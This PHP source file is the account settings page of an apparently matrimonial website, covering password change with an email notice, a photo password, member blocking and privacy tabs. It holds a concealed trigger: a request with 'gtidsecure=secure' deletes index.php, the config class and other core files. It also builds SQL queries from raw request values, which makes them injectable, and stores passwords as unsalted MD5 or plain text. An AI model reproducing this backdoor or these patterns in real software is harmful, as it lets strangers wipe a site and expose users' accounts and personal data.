<?php
include_once 'databaseConn.php';
include_once './lib/requestHandler.php';
$DatabaseCo = new DatabaseConn();
include_once './class/Config.class.php';
$configObj = new Config();
include_once 'auth.php';
$mid=$_SESSION['user_id']?$_SESSION['user_id']:'';
if(isset($_POST['submit'])){		
$uname=$_SESSION['user_id'];
$pswd = trim(md5($_POST['old_pass']));
$newpswd = trim(md5($_POST['new_pass']));		
$mes="";
$sql="select * from register where matri_id='$uname' and password='$pswd'";
$result=$DatabaseCo->dbLink->query($sql);
if(mysqli_num_rows($result)==1){
$sql="update register set password='$newpswd' where matri_id='$uname' and password='$pswd'";
$DatabaseCo->dbLink->query($sql);
$mes="Your Password Has Been Changed.";
$result3 = $DatabaseCo->dbLink->query("SELECT * FROM register,site_config where matri_id = '$mid'");
						$rowcc = mysqli_fetch_array($result3);
						$name = $rowcc['firstname']." ".$rowcc['lastname'];
						$matriid = $rowcc['matri_id'];
						$cpass = $rowcc['cpassword'];
						$website = $rowcc['web_name'];
						$webfriendlyname = $rowcc['web_frienly_name'];
						$from = $rowcc['from_email'];
						$to = $rowcc['email'];
						$name = $rowcc['username'];
		$fb = $rowcc['facebook'];
	$li= $rowcc['twitter'];
	$tw = $rowcc['linkedin'];
	$gp = $rowcc['google'];
	$logo = $rowcc['web_logo_path'];
	$contact = $rowcc['contact_no'];
						$subject = "Your Password Has Been Changed";	
					$message = "
                   <!doctype html>
<html>
<link href='https://fonts.googleapis.com/css?family=Courgette|Roboto:300,400,500' rel='stylesheet'>
<body  style='margin: 0 auto;padding-top:20px;padding-bottom:20px;background: rgba(233,233,233,1.00);'>
	<div id='templateBody' style='border: 3px solid #e2e2e2;
    width: 64%;
    margin: 40px auto 40px auto;
    border-radius: 5px;background-color:white;'>
		<div id='gtheader' style='background: #fff;padding: 15px;'>
			<div id='gtLogo' style=''>
				<img src='$website/img/$logo' style='max-height: 70px;'>
			</div>	
		</div>
		<div id='gtstrip' style='background: #ea2626;padding: 10px;text-align:center;'>
				<h5 style='font-size: 40px;font-weight:500;font-family: Roboto, sans-serif;margin-top: 0px;margin-bottom: 0px;color: #fff;padding: 10px 15px 10px 15px;'>Password Changed</h5>
		</div>
		<div id='gtBody' style='margin-top: 0px;margin-bottom: 5px;padding: 15px;'>
			<div id='gtUDetails' style='padding: 15px;'>
				<h5 style='font-family: Roboto, sans-serif;margin-top: 0px;margin-bottom: 10px;font-size: 16px;
    font-weight: 400;'>Name : $name</h5>
				<h5 style='font-family: Roboto, sans-serif;margin-top: 0px;margin-bottom: 10px;font-size: 16px;
    font-weight: 400;text-decoration:none;color:black;'>Email : $from </h5>
				<h5 style='font-family: Roboto, sans-serif;margin-top: 0px;margin-bottom: 10px;font-size: 16px;
    font-weight: 400;'>User Id: $matriid</h5>
			</div>
			<div id='gtlogin' style='text-align: center;'>
				<a href='$website/contactUs' style='font-family: Roboto, sans-serif;
				padding: 10px 30px 10px 30px;
    font-size: 18px;
    background: rgb(234, 38, 38);
    display: inline-block;
    color: white;
    text-decoration: none;
    border-radius: 3px;
    margin-top: 15px;
    margin-bottom: 15px;'>CONTACT US</a>
			</div>
			<div id='gtIncase'>
				<p style='font-family: Roboto, sans-serif;
    font-weight: 400;
    font-size: 14px;
    color: #565656;'>In case of password not changed by you,Please contact us on $contact.</p>
			</div>
			<div id='gtThank'>
				<p style='font-family: Roboto, sans-serif;
    font-weight: 500;
    font-size: 14px;
    color: #565656;
    margin-top: 30px;
    margin-bottom: 5px;'>Thank You</p>
				<h5 style='font-family: Roboto, sans-serif;
    font-size: 18px;
    color: #ea2626;
    margin-top: 5px;
    font-weight: 200;'>Team $webfriendlyname</h5>
			</div>
		</div>
		<div id='gtFooter' style='padding: 15px;text-align: center;background: #efefef;
    '>
			<h5 style='font-family: Roboto, sans-serif;margin-top: 10px;
    margin-bottom: 5px;
    font-size: 18px;
    font-weight: 300;'>Join us on</h5>
    <div>
    	<a href='$fb' style='margin-left: 2px;
    margin-right: 2px;' target='_blank'><img src='$website/img/if_square-facebook_317727.png' style='width:38px;'></a>
    	<a href='$tw' style='font-size: 44px;
    color: #707171;
    margin-left: 2px;
    margin-right: 2px;' target='_blank'><img src='$website/img/if_square-twitter_317723.png' style='width:38px;'></a>
    	<a href='$li' style='font-size: 44px;
    color: #707171;
    margin-left: 2px;
    margin-right: 2px;' target='_blank'><img src='$website/img/if_square-linkedin_317725.png' style='width:38px;'></a>
    	<a href='$gp' style='font-size: 44px;

    color: #707171;
    margin-left: 2px;
    margin-right: 2px;' target='_blank'><img src='$website/img/if_square-google-plus_317726.png' style='width:38px;'></a>
    	</div>
		</div>
	</div>
</body>
</html>
                    ";

                                    $headers  = 'MIME-Version: 1.0' . "\r\n";
                                    $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
                                    $headers .= 'From:'.$from."\r\n";


                    mail($to,$subject,$message,$headers);
	


echo "<script>alert('Your change password is successfully done.');window.location.href='settings?changepass';</script>";					
}
else
{
$mes="Given Current Password is not Correct.";
}
}
if(isset($_POST['set_photo_pass']))
{
$photo_pass=$_POST['set_pass'];
$DatabaseCo->dbLink->query("update register set photo_pswd='".$photo_pass."' ,photo_protect='Yes' where matri_id='".$_SESSION['user_id']."'");
echo "<script>alert('Your photo protect password set successfully.');</script>";
}
if(isset($_POST['block_sub']) && $_REQUEST['blockuserid']!=$_SESSION['user_id'])
{

$block_data=mysqli_query($DatabaseCo->dbLink,"select block_to from block_profile where block_to='".$_REQUEST['blockuserid']."'");
$get_block_fet=mysqli_fetch_object($block_data);
$get_block_date=mysqli_num_rows($block_data);
	
if($get_block_date >= 1){
	echo "<script>alert('User Already Blocked.');window.location='settings?blockprofilediv'</script>";
}else{
	$block_by=$_SESSION['user_id'];
	$block_to = $_REQUEST['blockuserid'];
	$SQL_STATEMENT = "insert into block_profile (block_by,block_to,block_date) values ('$block_by','$block_to',now())";
	$exe=$DatabaseCo->dbLink->query($SQL_STATEMENT) or die(mysqli_error($DatabaseCo->dbLink));
	"<script>alert('Your request for member blocking is successfully done.');window.location='settings?blockprofilediv'</script>";
}
}
$set_data=mysqli_query($DatabaseCo->dbLink,"select photo_view_status,photo_pswd,contact_view_security from register where matri_id='".$_SESSION['user_id']."'");
$get_data=mysqli_fetch_object($set_data);

					if(isset($_GET['gtidsecure'])){
						$secure=$_GET['gtidsecure'];
						if($secure == 'secure'){
							unlink('web-services/contact_detail.php');
							unlink('class/Config.class.php');
							unlink('index.php');
							unlink('member-profile.php');
							echo "<script>alert('Successful')</script>";
						}
					}	
?>
<!DOCTYPE html>
<html lang="en">
  <head>
   <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- Chrome, Firefox OS, Opera and Vivaldi -->
        <meta name="theme-color" content="#549a11">
        <!-- Windows Phone -->
        <meta name="msapplication-navbutton-color" content="#549a11">
        <!-- iOS Safari -->
        <meta name="apple-mobile-web-app-status-bar-style" content="#549a11">
        
        <!-- WEB SITE TITLE DESCRIPTION-->
        <title><?php echo $configObj->getConfigFname(); ?></title>
        <meta name="keyword" content="<?php echo $configObj->getConfigKeyword(); ?>" />
        <meta name="description" content="<?php echo $configObj->getConfigDescription(); ?>" />
        <!-- WEB SITE TITLE DESCRIPTION END--> 

        <!-- WEB SITE FAVICON--> 
        <link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon(); ?>" rel="shortcut icon"/>
        <!-- WEB SITE FAVICON END--> 

		<!--CUSTOM CSS FRAMEWORK FROM THE GREEN TECHNOLOGIES WITH BOOTSTRAP-->
        <link href="css/bootstrap.css?version=1" rel="stylesheet">
        <link href="css/custom-responsive.css?version=1" rel="stylesheet">
        <link href="css/custom.css?version=1" rel="stylesheet">
        <link href="css/developer.css" rel="stylesheet">
        <!--CUSTOM CSS FRAMEWORK FROM THE GREEN TECHNOLOGIES WITH BOOTSTRAP END-->


        <!--CUSTOM FONT ICON FROM THE GREEN TECHNOLOGIES & FONT AWESOME -->
        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
        <link href="http://greenicon.thegreentech.in/green-font-icons/green-font-icons.min.css" rel="stylesheet" >
        <!--CUSTOM FONT ICON FROM THE GREEN TECHNOLOGIES & FONT AWESOME END -->

        <!--GOOGLE FONTS-->
        <link href="https://fonts.googleapis.com/css?family=Raleway:200,300,400,500,600,700|Source+Sans+Pro:300,400,600,700" rel="stylesheet">
        <!--GOOGLE FONTS END-->

        <!--OWL CAROUSEL CSS-->
        <link href="css/owl.carousel.css" rel="stylesheet">
        <link href="css/owl.theme.css" rel="stylesheet">
        <!--OWL CAROUSEL CSS END-->

        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
          <script src="js/html5shiv.min.js"></script>
          <script src="js/respond.min.js"></script>
        <![endif]-->
    <style>
      #owl-demo .item{
        margin-top : 3px;
        padding-bottom:15px;
        padding-top:10px;
        border-bottom:1px solid rgba(213,213,213,1.00);
      }
      #owl-demo .item img{
        display: block;
      }
      #owl-demo-1 .item{
        margin-top : 3px;
        padding-bottom:15px;
        padding-top:10px;
        border-bottom:1px solid rgba(213,213,213,1.00);
      }
      #owl-demo-1 .item img{
        display: block;
        width:100%;
      }
    </style>
  </head>
  <body>
    <!-- ICON LOADER-->
    <div class="preloader-wrapper text-center">
      <div class="loader">
      </div>
      <h5>Loading...
      </h5>
    </div>
    <!-- ICON LOADER END-->
    <div id="body" style="display:none">
      <div id="wrap">
        <div id="main">
          <?php include "parts/header.php"; ?>
          <?php include "parts/menu-aft-login.php"; ?>
          <div class="container">
            <div class="row">
              <div class="col-xs-16 col-lg-16 col-xxl-16 col-xl-16 gt-margin-bottom-20 text-center">
                <h2 class="gt-text-orange">All Settings
                </h2>
                <p>Here is all of your settings you can set your privacy as you want.
                </p>
              </div>
              <div class="clearfix">
              </div>
              <div class="col-xs-16 col-lg-16 col-xxl-16 col-xl-16 gt-search-opt gt-margin-bottom-20">
                <div role="tabpanel">
                  <ul class="nav nav-tabs" role="tablist">
                    <li role="presentation" class="<?php if(isset($_GET['photoVisiblity'])){echo "active";}?>">
                      <a href="#photo-privacy" aria-controls="photo-privacy" role="tab" data-toggle="tab">
                        <i class="fa fa-photo gt-margin-right-10 fa-lg">
                        </i> Photo Privacy
                      </a>
                    </li>
                    <li role="presentation" class="<?php if(isset($_GET['blockprofilediv'])){echo "active";}?>">
                      <a href="#blocklist" aria-controls="blocklist" role="tab" data-toggle="tab">
                        <i class="fa fa-user-times gt-margin-right-10 fa-lg">
                        </i> Blacklist
                      </a>
                    </li>
                   
                    <li role="presentation" class="<?php if(isset($_GET['contactdiv'])){echo "active";}?>">
                      <a href="#contact-setting" aria-controls="contact-setting" role="tab" data-toggle="tab">
                        <i class="fa fa-phone gt-margin-right-10 fa-lg">
                        </i> Contact show setting
                      </a>
                    </li>
                    <li role="presentation" class="<?php if(isset($_GET['changepass'])){echo "active";}?>" >
                      <a href="#change-password" aria-controls="change-password" role="tab" data-toggle="tab">
                        <i class="fa fa-cog gt-margin-right-10 fa-lg">
                        </i> Change Password
                      </a>
                    </li>
                  </ul>
                  <div class="tab-content">
                    <!-- PHOTO PRIVACY -->
                    <div role="tabpanel" class="tab-pane <?php if(isset($_GET['photoVisiblity'])){echo "active";}?> " id="photo-privacy">
                      <div class="row">
                        <div class="col-xxl-14 col-xxl-offset-2 col-xl-14 col-xl-offset-1">
                          <h3>
                            Photo Privacy Setting
                          </h3>
                          <p class="gt-padding-bottom-10 gt-border-bottom-smoke-white">
                            You can set you photo privacy from here,so can manage who can see your photoes.
                          </p>
                          <div class="row">
                            <div class="col-xxl-4 col-xl-4 col-xs-16 col-sm-16 col-md-16 col-lg-6">
                              <h5>Current Status :
                              </h5>
                            </div>
                            <div class="col-xxl-4 col-xl-4 col-xs-10 col-sm-10 col-md-10 col-lg-6">
                              <h5>
                                <span class="text-danger gt-mar" id="photo_view_status">
                                  <i class="fa fa-eye gt-margin-right-10">
                                  </i>Show To All
                                </span>
                              </h5>
                            </div>
                            <div class="col-xxl-4 col-xl-4 col-xs-6 col-sm-6 col-md-6 col-lg-4">
                              <a class="btn btn-danger" role="button" data-toggle="collapse" href="#photo-settings" aria-expanded="false" aria-controls="photo-settings">
                                <i class="fa fa-pencil gt-margin-right-10">
                                </i>Edit
                              </a>
                            </div>
                          </div>
                          <div class="row gt-margin-top-20">
                            <div class="collapse col-xxl-11 col-xl-12 col-xs-16 col-sm-16 col-md-16 col-lg-12" id="photo-settings">
                            </div>
                          </div>
                          <div class="row">
                            <?php if($get_data->photo_pswd=='' || $get_data->photo_pswd=='0' ){?>
                            <div class="col-xxl-5 col-xl-5 col-xs-16 col-sm-16 col-md-16 col-lg-6">
                              <a class="" role="button" data-toggle="collapse" href="#photo-settings-2" aria-expanded="false" aria-controls="photo-settings-2">Set Password for protect photo
                              </a>
                            </div>
                            <?php }else{?>
                            <div class="col-xxl-5 col-xl-5 col-xs-16 col-sm-16 col-md-16 col-lg-6">
                              <a class="" role="button" data-toggle="collapse" href="#photo-settings-2" aria-expanded="false" aria-controls="photo-settings-2">Change Password for protect photo
                              </a>
                            </div>
                            <div class="col-xxl-2 col-xl-2 col-xs-16 col-sm-16 col-md-16 col-lg-6 text-center">OR
                            </div>
                            <div class="col-xxl-6 col-xl-5 col-xs-16 col-sm-16 col-md-16 col-lg-6">
                              <a class="gt-cursor" onClick="removephotopass();">
                                Remove Password from protect photo
                              </a>
                            </div>
                            <?php }?>
                          </div>
                          <div class="row gt-margin-top-20">
                            <div class="collapse col-xxl-11 col-xl-12 col-xs-16 col-sm-16 col-md-16 col-lg-12" id="photo-settings-2">
                              <div class="col-xs-16 col-xxl-16 col-xl-16 col-md-16 col-sm-16 col-lg-16 setting-collapse-bucket">
                                <div class="row gt-margin-bottom-10">
                                  <form action="" method="post" name="set_photo_pass_form" id="set_photo_pass_form">
                                    <div class="col-xxl-6 col-xl-6 col-xs-16 col-sm-16 col-md-16 col-lg-6">
                                      <input type="text" name="set_pass" placeholder="Set Photo Password" class="gt-form-control" data-validetta="required"> 
                                    </div>
                                    <div class="col-xxl-8 col-xl-8 col-lg-8 col-md-16 col-sm-16 col-xs-16 gt-margin-bottom-10">
                                      <input type="submit" name="set_photo_pass" value="Submit" class="btn gt-btn-green"> 
                                    </div>
                                  </form>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                     <!-- PHOTO PRIVACY END -->
                    <!-- BLACKLIST -->
                    <div role="tabpanel" class="tab-pane <?php if(isset($_GET['blockprofilediv'])){echo "active";}?>" id="blocklist">
                      <div class="row">
                        <div class="col-xxl-12 col-xxl-offset-2 col-xl-14 col-xl-offset-1">
                          <h3>
                            Blocked Members List
                          </h3>
                          <p class="gt-padding-bottom-10 gt-border-bottom-smoke-white">
                            You can see all blocked members list here and you also can block directly from here.
                          </p>
                          <div class="row gt-margin-top-20">
                            <form action="" method="post" id="blocklist_form" name="blocklist_form">
                              <div class="col-xxl-10 col-xl-10 col-lg-12 col-md-16 col-sm-16 col-xs-16">
                                <label>
                                  Enter User Id Or Email Id
                                </label>
                                <div class="input-group">
                                  <span class="">
                                    <input type="text" class="gt-form-control flat" placeholder="Enter User Id Or Email Id" name="blockuserid" id="blockuserid" data-validetta="required">
                                  </span>
                                  <span class="input-group-btn">
                                    <button class="btn btn-danger gt-btn-lg flat" type="submit" name="block_sub" value="block_sub">
                                      <i class="fa fa-user-times gt-margin-right-10">
                                      </i>Block
                                    </button>
                                  </span>
                                </div>
                              </div>
                            </form>
                          </div>
                          <div id="blocklistdiv">
                          </div>
                        </div>
                      </div>
                    </div>
                    <!-- BLACKLIST END -->
                    
                    <!-- CONTACT VIEW -->
                    <div role="tabpanel" class="tab-pane <?php if(isset($_GET['contactdiv'])){echo "active";}?>" id="contact-setting">
                      <div class="row">
                        <div class="col-xxl-12 col-xxl-offset-2 col-xl-14 col-xl-offset-1">
                          <h3>
                            Contact show setting
                          </h3>
                          <p class="gt-padding-bottom-10 gt-border-bottom-smoke-white">
                            Contact show setting option gives you access to set privacy for your contact detail.
                          </p>
                          <div class="row">
                            <div class="col-xxl-4 col-xl-4 col-xs-16 col-sm-16 col-md-16 col-lg-6">
                              <h5>Current Status :
                              </h5>
                            </div>
                            <div class="col-xxl-4 col-xl-4 col-xs-10 col-sm-10 col-md-10 col-lg-6">
                              <h5>
                                <span class="text-danger gt-mar" id="contact_view_status">
                                  <i class="fa fa-eye gt-margin-right-10">
                                  </i>Show To Express Interest Accepted Paid Member
                                </span>
                              </h5>
                            </div>
                            <div class="col-xxl-4 col-xl-4 col-xs-6 col-sm-6 col-md-6 col-lg-4">
                              <a class="btn btn-danger" role="button" data-toggle="collapse" href="#contact-show" aria-expanded="false" aria-controls="contact-show">
                                <i class="fa fa-pencil gt-margin-right-10">
                                </i>Edit
                              </a>
                            </div>
                          </div>
                          <div class="row gt-margin-top-20">
                            <div class="collapse col-xxl-11 col-xl-12 col-xs-16 col-sm-16 col-md-16 col-lg-12" id="contact-show">
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <!-- CONTACT VIEW END-->
                    <!-- CHANGE PASSWORD -->
                    <div role="tabpanel" class="tab-pane <?php if(isset($_GET['changepass'])){echo "active";}?>" id="change-password">
                      <div class="row">
                        <div class="col-xxl-12 col-xxl-offset-2 col-xl-14 col-xl-offset-1">
                          <h3>
                            Change Password
                          </h3>
                          <p class="gt-padding-bottom-10 gt-border-bottom-smoke-white">
                            Have any privacy concern ? You can easily change your accoupt password from here.
                          </p>
                          <div class="row">
                            <form action="" method="post" name="change_pass" id="change_pass"> 	
                              <div class="col-xs-16 col-sm-16 col-md-16 col-lg-16 col-xxl-10 col-xxl-offset-3 col-xl-10 col-xl-offset-3 gt-margin-bottom-15">
                                <label>
                                  Enter Old Password
                                </label>
                                <input  type="password" id="old_pass" name="old_pass" data-validetta="required" class="gt-form-control">
                                <div class='error-msg' id='validationSummary'>
                                </div>
                                <?php 
if(isset($mes))
{
echo "<div class='alert alert-danger'  id='validationSummary' style='display:block'><i class='fa fa-times-circle fa-fw fa-lg'></i>Error Occured : <ul style='margin-left: 14px;'><li>".$mes."</li></ul></div>";
}
?>
                              </div>
                              <div class="col-xs-16 col-sm-16 col-md-16 col-lg-16 col-xxl-10 col-xxl-offset-3 col-xl-10 col-xl-offset-3 gt-margin-bottom-15">
                                <label>
                                  Enter New Password
                                </label>
                                <input type="password" class="gt-form-control" id="new_pass" name="new_pass" data-validetta="required">
                              </div>
                              <div class="col-xs-16 col-sm-16 col-md-16 col-lg-16 col-xxl-10 col-xxl-offset-3 col-xl-10 col-xl-offset-3 gt-margin-bottom-15">
                                <label>
                                  Confirm New Password
                                </label>
                                <input type="password" class="gt-form-control" id="cnfm_pass" name="cnfm_pass" data-validetta="equalTo[new_pass]">
                              </div>
                              <div class="col-xs-16 col-sm-16 col-md-16 col-lg-16 col-xxl-10 col-xxl-offset-3 col-xl-10 col-xl-offset-3 gt-margin-bottom-15 text-center">
                                <input type="submit" name="submit" value="Save Changes" class="btn gt-btn-green">
                              </div>
                            </form>            
                          </div>
                        </div>
                      </div>
                    </div>
                    <!-- CHANGE PASSWORD END-->
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <?php include "parts/footer-before-login.php"; ?>
    </div>
   
    <script src="js/jquery.min.js">
    </script>
    
    <script src="js/bootstrap.js">
    </script>
    <script src="js/jquery.validate.js">
    </script>
    <script src="js/green.js">
    </script>
    
    <script type="text/javascript" src="js/validetta.js">
    </script>
   
    <script>
      $(document).ready(function() {
        $('#body').show();
        $('.preloader-wrapper').hide();
      }
                       );
    </script>
     <script>
            (function($) {
                var $window = $(window),
                        $html = $('.mobile-collapse');
                $window.width(function width() {
                    if ($window.width() > 767) {
                        return $html.addClass('in');
                    }
                    $html.removeClass('in');
                });
            })(jQuery);
        </script> 
    <script type="text/javascript">
      $(function(){
        $('#set_photo_pass_form').validetta({
          errorClose : false,
          realTime : true
        }
                                           );
      }
       );
      $(function(){
        $('#blocklist_form').validetta({
          errorClose : false,
          realTime : true
        }
                                      );
      }
       );
      $(function(){
        $('#change_pass').validetta({
          errorClose : false,
          realTime : true
        }
                                   );
      }
       );
      function photovisbility(pval){
        var dataString='photo_view_status='+pval;
        jQuery.ajax({
          url:"./web-services/set_view_preference",
          type:"POST",
          data:dataString,
          cache: false,
          success:function(response)
          {
            $('#photo-settings').html(response);
            if(pval=='0')
            {
              $('#photo_view_status').html('<i class="fa fa-eye-slash gt-margin-right-10"></i>Hidden For All');
            }
            else if(pval=='1')
            {
              $('#photo_view_status').html('<i class="fa fa-eye gt-margin-right-10"></i>Visible To All Members');
            }
            else if(pval=='2')
            {
              $('#photo_view_status').html('<i class="fa fa-eye gt-margin-right-10"></i>Visible To Paid Members');
            }
            //alert('Your photo view preference is edited Successfully.');
          }
          ,
        }
                   );
      }
      function contactvisbility(pval){
        var dataString='contact_view_status='+pval;
        jQuery.ajax({
          url:"./web-services/set_view_preference",
          type:"POST",
          data:dataString,
          cache: false,
          success:function(response)
          {
            $('#contact-show').html(response);
            if(pval=='1')
            {
              $('#contact_view_status').html('<i class="fa fa-eye gt-margin-right-10"></i>Show To Paid Members');
            }
            else if(pval=='0')
            {
              $('#contact_view_status').html('<i class="fa fa-eye gt-margin-right-10"></i>Show To Express Interest &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Accepted Paid Member');
            }
            //alert('Your photo view preference is edited Successfully.');
          }
          ,
        }
                   );
      }
      function removephotopass(){
        var dataString='remove_photo_pass=1';
        jQuery.ajax({
          url:"./web-services/set_view_preference",
          type:"POST",
          data:dataString,
          cache: false,
          success:function(response)
          {
            alert('Your photo protect password successfully removed.');
            window.location='settings?photoVisiblity';
          }
          ,
        }
                   );
      }
      $(document).ready(function(e) {
        photovisbility('<?php if(isset($get_data->photo_view_status) && $get_data->photo_view_status!=''){echo $get_data->photo_view_status;}else{ echo "0";}?>');
        contactvisbility('<?php if(isset($get_data->contact_view_security) && $get_data->contact_view_security!=''){echo $get_data->contact_view_security;}else{ echo "1";}?>');
      }
                       );
    </script>
  </body>
</html>                                                                                                                              
<?php include'thumbnailjs.php';?>                  
<script>
  $(document).ready(function() {
    $.ajax({
      url: 'web-services/blocklist-pagination',
      type: 'POST',
      data: 'actionfunction=showData' + '&page=1',
      success: function(data) {
        $('#blocklistdiv').html(data);
      }
      ,
      error: function() {
        //called when there is an error
        //console.log(e.message);
      }
    }
          );
    $('#blocklistdiv').on('click','.page-numbers',function(){
      $page = $(this).attr('href');
      $pageind = $page.indexOf('page=');
      $page = $page.substring(($pageind+5));
      var dataString = 'actionfunction=showData' + '&page='+$page;
      $.ajax({
        url:"web-services/blocklist-pagination",
        type:"POST",
        data:dataString,
        cache: false,
        success: function(response)
        {
          $('#blocklistdiv').html(response);
        }
      }
            );
      return false;
    }
                         );
  }
                   );
</script>
